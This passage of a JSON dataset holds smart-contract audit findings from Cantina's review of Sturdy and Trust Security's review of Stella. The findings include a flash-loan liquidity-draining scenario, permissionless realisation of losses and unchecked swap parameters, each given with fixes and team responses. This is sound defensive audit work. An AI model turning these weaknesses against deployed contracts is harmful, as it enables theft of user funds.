incentive to perform such an attack. If the attacker is a large lender in a silo and does not utilize the vault aggregator, removing the liquidity from the silo would lead to a higher APR (less idle), thereby increasing the interest earned on the attacker's funds.\n\n## Recommendation\n- Analyze the economic incentives of all potential actors.\n- Add potential restrictions to the use of `requestLiquidity`.\n- Consider implementing a fee for high liquidity requests.\n\n## Responses\n**Sturdy:** Acknowledged. We set a limit on moving funds between silos for JIT liquidity, as addressed in ChainSecurity commit `33a4136b`.\n\n**Cantina:** Fixed. There are now two levels to limit liquidity amounts: a global utilization target limit (denoted as a percentage of total deposits) on the requesting silo, and withdrawal amounts from other silos meeting the liquidity demand (capped at each silo's utilization target).",
      "summary": "\nThe report discusses a vulnerability in the SiloGateway.borrowAsset function in DebtManager.sol. This function allows users to request liquidity from other silos to fulfill a high borrow amount. However, there are no limitations on how much liquidity can be requested, making it exploitable by attackers. The attack involves taking a flash loan and then requesting all available liquidity from other silos, resulting in a high amount of unused liquidity in the attacker's silo. This reduces the APR for lenders and concentrates all available liquidity in the attacker's silo. The report recommends analyzing the economic incentives of all potential actors and implementing restrictions or fees for high liquidity requests. The issue has been acknowledged and fixed by the developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54504",
      "title": "SiloManager.borrowAsset allows to pass arbitrary _collateralAsset parameter ",
      "impact": "LOW",
      "content": "## SiloGateway.sol Analysis\n\n## Context\n- **File**: SiloGateway.sol\n- **Line**: 57\n\n## Description\nThe `borrowAsset` function doesn’t verify if the passed `_collateralAsset` parameter is the actual collateral used by the silo.\n\n## Recommendation\nConsider if the parameter can be derived from the silo. For instance, a FraxLend market has `collateralContract()`.\n\n## Status\n- **Sturdy**: Addressed in commit a2c3b35c.\n- **Cantina**: Fixed. `_collateralAsset` is checked to be equivalent to the silo's collateral.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy-fixes_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54503",
      "title": "Usage of custom error types ",
      "impact": "LOW",
      "content": "## DebtManager.sol#L6\n\n## Description\nUse custom error types instead of a library with string constants.\n\n## Recommendation\nInstead of using the custom string library:\n\n```solidity\nlibrary Errors {\n    string internal constant AG_FEE_TOO_BIG = \"1\";\n    //...\n}\n\n// usage\nrequire(condition, Errors.AG_FEE_TOO_BIG);\n```\n\nCustom error types could be used as follows:\n\n```solidity\n// define in contract\nerror AG_FEE_TOO_BIG();\n\n// usage\nif (!condition) revert AG_FEE_TOO_BIG();\n```\n\n## Sturdy\nAddressed in commit 03145881.\n\n## Cantina\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy-fixes_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54502",
      "title": "Cleanup aprOracle naming in DebtManager ",
      "impact": "LOW",
      "content": "## Context: DebtManager.sol#L34\n\n## Description\nDebtManager is still using the term **apr** in the oracle name.\n\n## Recommendation\nRemove the term **apr** from the oracle, since the new approach is not based on **apr** anymore.\n\n## Status\n- **Sturdy**: Addressed in commit `97367cd4`.\n- **Cantina**: Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy-fixes_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54501",
      "title": "Improvements and cleanup recommendations ",
      "impact": "LOW",
      "content": "## DebtManager.sol Improvements\n\n## Context\nThis document outlines a couple of small improvements that may be applied to the codebase.\n\n## Description\nThis issue outlines a couple of small improvements that may be applied to the codebase.\n\n## Recommendation\nConsider applying the recommendations listed below.\n\n### 1. Redundant Import\n```solidity\n- import {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n```\n\n### 2. Redundant boolean comparison\n```solidity\n- require(strategyAvails[position.strategy] == true, Errors.AG_NOT_AVAILABLE_STRATEGY);\n+ require(strategyAvails[position.strategy], Errors.AG_NOT_AVAILABLE_STRATEGY);\n```\n\n### 3. Spelling Error\n```solidity\n- SetZKVerfier\n+ SetZKVerifier\n```\n\n### 4. Comment Improvement\n```solidity\n- // strategy -> bool, if the strategy is added ? true : 0\n+ // strategy -> bool, if the strategy is added ? true : false\n```\n\n### 5. Rename `minAmount` to `allowedSlippage`\nIt's counter-intuitive of requiring the amount to be less than a minimum because of the variable name.\n```solidity\nrequire(requiredAmount < minAmount, Errors.AG_INSUFFICIENT_ASSETS);\n- minAmount\n+ allowedSlippage\n```\n\n### 6. Cache repeated calculation of `requestingStrategyData.current_debt + _amount`\nThe calculation is performed thrice in `requestLiquidity`. It can be saved in a variable `strategyNewDebt` instead (tested to not exceed stack size).\n\n## Status\n- **Sturdy:** Addressed in commit `17c9d648`.\n- **Cantina:** Fixed. All recommendations were adopted.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy-fixes_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54500",
      "title": "SiloGateway.setSlippage can be set to more than 100% ",
      "impact": "LOW",
      "content": "## Context: SiloGateway.sol#L37\n\n## Description\nThe slippage in the SiloGateway can be set to more than 100%.\n\n## Recommendation\nConsider a reasonable upper limit to prevent an incorrect assignment.\n\n## Sturdy\nAddressed in commit `64dce459`.\n\n## Cantina\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy-fixes_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54499",
      "title": "DebtManager.setUtilizationTargetOfStrategy doesn’t check if strategy exists ",
      "impact": "LOW",
      "content": "## Context\n**File:** DebtManager.sol  \n**Line:** 170\n\n## Description\nThe `setUtilizationTargetOfStrategy` function doesn't check if the strategy exists before setting the utilization target.\n\n## Recommendation\nAdd a check to verify if the strategy exists.\n\n## Sturdy\nAddressed in commit `f8faabfb`.\n\n## Cantina\nFixed. The redundant `== true` equivalence check is removed in a subsequent commit when custom errors are used in lieu of require statements and revert strings.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy-fixes_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54498",
      "title": "Sub-optimal strategy selection as oracle.getUtilizationInfo is based on global supply and borrows ",
      "impact": "LOW",
      "content": "## DebtManager Analysis\n\n## Context\n**File:** DebtManager.sol#L442\n\n## Description\nThe `oracle.getUtilizationInfo` function used in `DebtManager._getAvailableAmountsAndDatas()` returns the global borrow and supply. For example, the `getUtilizationInfo` of `AaveV3AprOracle` is defined as follows:\n\n```solidity\n/**\n * @dev Get the current utilization info.\n * @param _strategy The strategy to get the utilization info of.\n * @return The current utilization info of the strategy.\n */\nfunction getUtilizationInfo(\n    address _strategy\n) external view override returns (uint256, uint256) {\n    address asset = IAaveV3Strategy(_strategy).asset();\n    address aToken = IAaveV3Strategy(_strategy).aToken();\n    DataTypesV3.ReserveData memory reserveData = LENDING_POOL.getReserveData(\n        asset\n    );\n    uint256 availableLiquidity = IERC20(asset).balanceOf(aToken);\n    uint256 totalDebt = IERC20Metadata(reserveData.stableDebtTokenAddress).totalSupply();\n    totalDebt += IERC20Metadata(reserveData.variableDebtTokenAddress).totalSupply();\n    return (totalDebt, totalDebt + availableLiquidity);\n}\n```\n\nThe `requestLiquidity` function can only operate on supply deposited by the vault and can't access the global liquidity. This results in higher `availableAmounts` returned by `_getAvailableAmountsAndDatas`. In the `requestLiquidity` function, this would result in a higher `withdrawAmount`.\n\nIf `withdrawAmount >= current_debt`, then `newDebt = 0` for the `vault.update_debt` function. This wouldn't result in a problem because only the available debt would be withdrawn. However, it may be a sub-optimal movement of funds, as the vault could have very high global liquidity but very low liquidity deposited. The sorting would not result in the strategies with the highest available liquidity coming first.\n\n## Recommendation\nConsider using the minimum of the strategy's `current_debt` and the calculated amount for the amounts returned by the `_getAvailableAmountsAndDatas` function.\n\n## Sturdy\nAddressed in commit `dae43397`.\n\n## Cantina\nFixed, as per the recommendation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy-fixes_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54497",
      "title": "The slippage parameter in requestLiquidity can result in blocking remaining requests ",
      "impact": "LOW",
      "content": "## Context\n**File:** DebtManager.sol#L352\n\n## Description\nThe `requestLiquidity` function is used to request liquidity from other strategies in the vault. In some edge cases (like losses), the `vault.update_debt` method, which is used to change the liquidity, doesn't update to the exact `newDebt`, resulting in rounding issues. This means that after the liquidity request steps, `requiredAmount` wouldn't be equal to zero, and some DUST would remain in `requiredAmount`.\n\nTo address this, the Sturdy team introduced a slippage parameter, which is used to calculate a `minAmount` that is still tolerated:\n\n```solidity\nuint256 minAmount = requiredAmount * _slippage / UTIL_PREC;\n```\n\nAfter the liquidity request steps, an amount smaller than `minAmount` would still be tolerated:\n\n```solidity\nrequire(requiredAmount < minAmount, Errors.AG_INSUFFICIENT_ASSETS);\n```\n\nIn addition, an early stop condition has been added in case the `requiredAmount` gets smaller than the `minAmount`:\n\n```solidity\n// early stop\nif (requiredAmount < minAmount) break;\n```\n\nHowever, this early stop can also result in blocking required requests if the slippage is set too high.\n\n## Example\nIf we have two silos and one requesting silo together with a slippage of 1%:\n\n- Silo A → 1m liquidity available.\n- Silo B → 1m liquidity available.\n\nThe `requestLiquidity` function would revert if `_amount > 1m` && `_amount < 1m + 10k`, because the loop would stop after silo A in the early stop condition:\n\n```solidity\nif (requiredAmount < minAmount) break;\n```\n\nThe additional needed liquidity from silo B would not be requested.\n\n## Recommendation\nAdd an upper limit for the slippage parameter.\n\n## Status\n- **Sturdy:** Addressed in commit 4a063dd5.\n- **Cantina:** Fixed. Max slippage settable is capped at 0.01%.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy-fixes_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54496",
      "title": "Permissionlessly realising strategy loss may be exploitable ",
      "impact": "LOW",
      "content": "## DebtManager Review\n\n## Context\n**File:** DebtManager.sol  \n**Lines:** 330-332  \n\n## Description\nWhile `requestLiquidity()` is restricted to whitelisted gateways, the `SiloGateway`'s `borrowAsset()` is permissionless. Hence, `requestLiquidity()` is indirectly permissionless for JIT (Just-In-Time) liquidity requests. \n\nIn the event that the selected strategy to pull liquidity from has unrealised losses, the loss will be realised immediately. Thus, realising a vault's loss is permissionless and may possibly be exploited through the use of flash loans to create JIT liquidity requests. \n\nIt could be the case that the strategy's loss is impermanent/temporary and shouldn’t be realised at that point in time (e.g., unrealised loss as a result of a temporal de-pegging of the asset).\n\n## Recommendation\nSkip pulling liquidity from strategies with unrealised losses. It is safer for losses to be realised only with manual intervention. In this regard, also consider if realising losses through the `zkVerifier` should be allowed.\n\n## Code Snippet\n```solidity\nif (vault.assess_share_of_unrealised_losses(strategies[i], strategyDatas[i].current_debt - newDebt) != 0) {\n    - vault.process_report(strategies[i]);\n    + continue;\n}\n```\n\n## Status\n- **Sturdy:** Addressed in commit `b93936e4`.\n- **Cantina:** Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy-fixes_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54495",
      "title": "DebtManager.manualAllocation vault.totalIdle can be lower than vault.minimum_total_- idle() ",
      "impact": "MEDIUM",
      "content": "## DebtManager.sol Context Review\n\n## Context\n**File:** DebtManager.sol  \n**Line:** 405\n\n## Description\nIn case `vault.totalIdle()` is smaller than `vault.minimum_total_idle()`, there should be a `continue`. The `totalIdle` can be lower than the minimum.\n\n## Recommendation\n```solidity\n// deposit/increase not possible because minimum total idle reached\nif (position.debt > strategyData.current_debt &&\n- vault.totalIdle() == vault.minimum_total_idle()) continue;\n+ vault.totalIdle() <= vault.minimum_total_idle()) continue;\n```\n\n## Status\n- **Sturdy:** Addressed in commit 873c38a5.\n- **Cantina:** Fixed.",
      "summary": "\nThe report is about a bug in a code file called DebtManager.sol, specifically on line 405. The bug occurs when the total idle amount in the vault is less than the minimum required amount. The recommendation is to change the code to include an equal or less than sign instead of just an equal sign. The bug has been addressed and fixed in a commit called 873c38a5.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy-fixes_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "19074",
      "title": "LendingProxy.initialize() should call __ReentrancyGuard_init()",
      "impact": "LOW",
      "content": "It is best practice for contracts that inherit from ReentrancyGuardUpgradeable to call \n`__ReentrancyGuard_init()` in the initialize function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19073",
      "title": "Using separate maxDelayTime for ETH-USD feed.",
      "impact": "LOW",
      "content": "In ChainlinkAdapterOracle, when the token uses **refETH** to get the price, it will use the same \n**maxDelayTime** for both feeds. \n\nOn Arbitrum with a 24H heartbeat for ETH-USD and a 24H heartbeat for *-ETH, it will work \njust fine.\n\nBut on Ethereum, ETH-USD has a heartbeat of 1H and *-ETH has a heartbeat of 24H. Since \nthey use the same heartbeat, the heartbeat needs to be slower of the two or else the contract \nwould be nonfunctional most of the time. The issue is that it would allow the consumption of\npotentially very stale data from the ETH-USD feed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19072",
      "title": "TRST-L-12 The owner can grant anyone the whitelistedStrategy role to transfer the tokens of approved users",
      "impact": "LOW",
      "content": "**Description:**\nThe owner of an AccessController contract can grant any role to anyone, and the \n**whitelistedStrategy** role can call `StrategyGateway.transferToken()` to transfer the approved \nuser's tokens.\nA more transparent mechanism for granting user roles should be used.\n```solidity\n        function transmitToken(\n            address _token,\n             address _from,\n                address _to,\n             uint _amount\n         ) external onlyAuthorized(keccak256('whitelistedStrategy')) {\n        IERC20(_token).safeTransferFrom(_from, _to, _amount);\n        }\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19071",
      "title": "TRST-L-11 feeBPS and lenderLiquidatePremiumBPS need to be limited to a maximum value",
      "impact": "LOW",
      "content": "**Description:**\nfeeBPS is used to determine the profit received by the Lending Pool, and \nlenderLiquidatePremiumBPS is used to determine the premium paid by the liquidator, when \nboth values are large, the user will suffer a loss, so a reasonable limit should be set for both \nvalues.\n```solidity\n        function shareProfit(address _token, uint _profit) external {\n          uint toTreasury = (_profit * feeBPS[_token]) / BPS;\n             uint toRewardVault = _profit - toTreasury;\n        // send to treasury\n        IERC20(_token).safeTransferFrom(msg.sender, treasury, toTreasury);\n        // send to reward vault\n             IERC20(_token).safeTransferFrom(msg.sender, rewardVault, toRewardVault);\n        emit ProfitShare(msg.sender, _token, toRewardVault, toTreasury, block.timestamp);\n        }\n        ...\n                uint lenderLiquidatationPremiumBPS = IConfig(config).lenderLiquidatePremiumBPS();\n        for (uint i; i < sharingProfitTokenAmts.length; ) {\n                 sharingProfitTokenAmts[i] +=\n             (pos.openTokenInfos[i].borrowAmt * lenderLiquidatationPremiumBPS) /\n        BPS;\n        unchecked {\n        ++i;\n            }\n        }\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19070",
      "title": "TRST-L-10 transferToTreasury() does not check whether the LendingPool has been delisted",
      "impact": "LOW",
      "content": "**Description:**\n`transferToTreasury()` is used to transfer rewards from a delisted LendingPool to Treasury, but \nit does not check if the LendingPool has been delisted, which allows it to transfer rewards \nfrom any LendingPool to Treasury.\n```solidity\n        /// @dev transfer fund to treasury (incase: delist lending pool)\n        /// @param _token token address to transfer.\n        function transferToTreasury(address _token) external override onlyAuthorized(keccak256('exec')) \n             {\n        uint totalReward = IERC20(_token).balanceOf(address(this));\n        // get treasury address.\n            address treasury = ILendingProxy(lendingProxy).treasury();\n        // transfer to treasury address.\n        IERC20(_token).safeTransfer(treasury, totalReward);\n            emit TransferToTreasury(treasury, totalReward);\n        }\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19069",
      "title": "TRST-L-9 RewardVault distributes rewards based on the percentage of the balance, which can cause Lender to lose some profit",
      "impact": "LOW",
      "content": "**Description:**\nWhen RewardVaultWorker calls `RewardVault.distributeReward()` to distribute rewards to the \nLendingPool, the maximum number of rewards to distribute is less than the \n**balance * maxRewardDistributionFactorE18 / 1e18**. As long as **maxRewardDistributionFactorE18 < 1e18**, a portion of the reward will remain in RewardVault and cannot be sent to \nLendingPool, which will cause Lender to lose some profit.\n\n**Recommended Mitigation:**\nConsider a new emission algorithm, like dividing the current balance by a fixed time (30 days) \nfor the emission rate and multiplying by the time interval for the emission quantity.\n\n**Team response:**\nThis is the intended behavior.\n\n**Mitigation Review:**\nIt is better to document this behavior.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19068",
      "title": "TRST-L-8 Freezing of deposited funds freezes all user shares",
      "impact": "LOW",
      "content": "**Description:**\nNewly provided liquidity in pools is frozen for **mintFreezeInterval** seconds. During the freeze \nperiod, share tokens cannot be redeemed and transferred. However, the freeze period \ndisables transferring of all user’s share tokens, including those for which the freeze period has \nexpire and those that were received from other users:\n1. If a user makes multiple deposits, the most recent of them will freeze all previous \ndeposited funds by the user.\n2. If a user receives shares from another user while their recent deposited shares are \nfrozen, they won’t be able to transfer or redeem the received shares until the freeze \nperiod has expired.\n\n**Recommended Mitigation:**\nIn the `_mintInternal()` function, consider freezing only deposited amounts. The improved \nmechanism needs to correctly handle multiple deposits and guarantee that amounts \ndeposited earlier get unfrozen in time, while amount deposited later remain frozen.\n\n**Team response:**\nIntended behavior.\n\n**Mitigation Review:**\nInformational, agreed. Will be left in the report for the awareness of users.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19067",
      "title": "TRST-L-7 Total lender profit USD value doesn’t include the liquidation premium",
      "impact": "LOW",
      "content": "**Description:**\nDuring a liquidation, the amount of profit to be shared with lenders is increased(https://github.com/AlphaFinanceLab/stella-arbitrum-private-contract/blob/3a4e99307e9cbf790279e49a4d90771e5486c51d/contracts/stella-strategies/position-managers/base/BasePositionViewer.sol#L437-L439) by the \nliquidation premium. However, the total USD value of lender profit \n(**lenderProfitUSDValueE36**) is not updated accordingly. As a result, the calculation of the \nfunds to return to the borrower is increased by the liquidation premium (**userUSDValueReturnE36**), leading to an increased required payment for the liquidator \n(**requiredPayAmount**). In the worst case scenario, when user’s position has accrued bad debt \n(i.e. the total collateral value is less than the amount of funds to pay to lenders), the user may \nstill have some of their funds returned to them due to a false positive in this(https://github.com/AlphaFinanceLab/stella-arbitrum-private-contract/blob/3a4e99307e9cbf790279e49a4d90771e5486c51d/contracts/stella-strategies/position-managers/base/BasePositionViewer.sol#L473) if-clause:.\n\n**Recommended Mitigation:**\nWhen adding the liquidation premium to the **sharingProfitTokenAmts** array elements, \nconsider also adding it to the **lenderProfitUSDValueE36** variable. \n\n**Team response:**\nThe original design is for the liquidator to pay for this, hence not adding to the value, but we \nthink this will just overcomplicate things, since the liquidator will need to wait for when it’s \nprofitable anyways. So we’ll just update the value as suggested. But the logic should already \nwork as is, it’s just an alternative solution, so the issue should be informational.\n\n**Mitigation Review:**\nInformational, agreed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19066",
      "title": "TRST-L-6 Liquidation token claiming event spam",
      "impact": "LOW",
      "content": "**Description:**\nClaiming liquidation tokens via the `LiquidationVault.claim()` function emits the Claimed event. \nThe function takes an array of **BatchClaimInfo**, each of which can contain multiple **ClaimInfos**; \nclaiming an amount specified in a **ClaimInfo** emits the Claimed event. However, the event is \nemitted even when the claimed amount is 0 (i.e. when the caller is not eligible for any \nliquidation tokens). As a result, the `LiquidationVault.claim()` function can emit multiple \nClaimed events in one call, while no tokens are actually claimed. This spamming can affect off-chain monitoring and analysis tools that, for example, watch the event to track all claims.\n\n**Recommended Mitigation:**\nConsider emitting the Claimed event only after a positive amount of liquidation tokens was \nclaimed.\n\n**Team response:**\nFixed\n\n**Mitigation Review:**\nThe team makes the function revert when trying to claim 0.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19065",
      "title": "TRST-L-5 UsingAccessControllerUpgradeable doesn’t reserve storage slots",
      "impact": "LOW",
      "content": "**Description:**\nThe UsingAccessControllerUpgradeable contract is an upgradeable contract that implements \nthe logic of interacting with an AccessController contract for multiple contracts in the project. \nUsingAccessControllerUpgradeable, however, doesn’t reserve storage slots for future \nupdated to the contract: adding a new storage variable to the contract will shift the layout of \nstorage variable of all contract that inherit from it, which will result in corrupted state of the \ncontracts.\n\n**Recommended Mitigation:**\nConsider reserving 49 storage slots UsingAccessControllerUpgradeable by defining a storage \nvariable of type uint256[49] at the end of the contract. For more information refer to the \nOpenZeppelin’s Writing Upgradeable Contracts guide(https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#storage-gaps).\n\n**Team response:**\nFixed\n\n**Mitigation Review:**\nThe team reserved storage slots in UsingAccessControllerUpgradeable",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19064",
      "title": "TRST-L-4 addToFreezeBuckets() is inconsistent with the documentation",
      "impact": "LOW",
      "content": "**Description:**\nSuppose user deposits tokens at **timestamp == startTimestamp+interval**. According to the \ndocs, the tokens will be unlocked at **startTimestamp+2*interval**, but they will actually be \nunlocked at **startTimestamp+3*interval**.\n\n**Recommended Mitigation:**\nConsider making the deposit_flow.png diagram consistent with the code.\n\n**Team response:**\nFixed.\n\n**Mitigation Review:**\nThe team uploaded the correct image to the documentation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19063",
      "title": "TRST-L-3 When swapping tokens, swapParams.tokenIn/tokenOut must be underlyingToken",
      "impact": "LOW",
      "content": "**Description:**\nWhen swapping tokens in some functions, there is no requirement that \n**swapParams.tokenIn/tokenOut** must be the **underlyingToken**, allowing an attacker to use \nthe tokens in the contract for arbitrary swaps.\nAssuming Alice accidentally sends some **tokenA** into the contract, Bob can use this issue to \nswap these **tokenA** into **underlyingToken** and withdraw them when closing a position.\n\n**Recommended Mitigation:**\nConsider requiring **swapParams.tokenIn/tokenOut** to be **underlyingToken** when swapping \ntokens.\n\n**Team response:**\nAcknowledged.\n\n**Mitigation Review:**\nThe team says that the swapHelper would have prevented this from whitelisting.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19062",
      "title": "TRST-L-2 In _takeToken(), when the token address is WETH, the user can only use ETH, not WETH",
      "impact": "LOW",
      "content": "**Description:**\nIn _takeToken(), when the token address is WETH, it checks **msg.value == amount**, which \nmeans that the user can only use ETH and not WETH.\n\n**Recommended Mitigation:**\nChange to\n```solidity\n    function _takeToken(\n        address _gateway,\n            address _token,\n                address _from,\n                     address _to,\n        uint128 _amount\n             ) internal returns (uint128 amount) {\n                - if (_from == _to || (_token == WETH && msg.value != _amount)) {\n                     + if (_from == _to || (_token == WETH && (msg.value != _amount || msg.value != 0)) {\n                        revert InvalidTakeToken();\n        }\n        if (_amount > 0) {\n            - if (_token == WETH) {\n                + if (_token == WETH && msg.value == _amount) {\n                    IWETH9(WETH).deposit{value: msg.value}();\n            if (_to != address(this)) {\n        IERC20(WETH).safeTransfer(_to, msg.value);\n        }\n                    amount = msg.value.toUint128();\n        } else {\n                uint balanceBefore = IERC20(_token).balanceOf(address(this));\n            IStrategyGateway(_gateway).transmitToken(_token, _from, _to, _amount);\n        amount = (IERC20(_token).balanceOf(address(this)) - balanceBefore).toUint128();\n            }  \n        }\n        }\n ```\n\n**Team response:**\nIntended behavior\n\n**Mitigation Review:**\nThe team says this makes end users not have to worry about WETH at all.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19061",
      "title": "TRST-L-1 In some setter functions of the Config.sol, the input should be checked",
      "impact": "LOW",
      "content": "**Description:**\nIn Config.setLpCollateralFactorBPSs()/setCollateralFactors(), the factors set should be less \nthan **ONE_E18**.\n\n**Recommended Mitigation:**\nIn Config.setLpCollateralFactorBPSs()/setCollateralFactors() check that the factor is less than \n**ONE_E18**\n\n**Team response:**\nFixed\n\n**Mitigation Review:**\nThe team verified the parameters in the setter.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
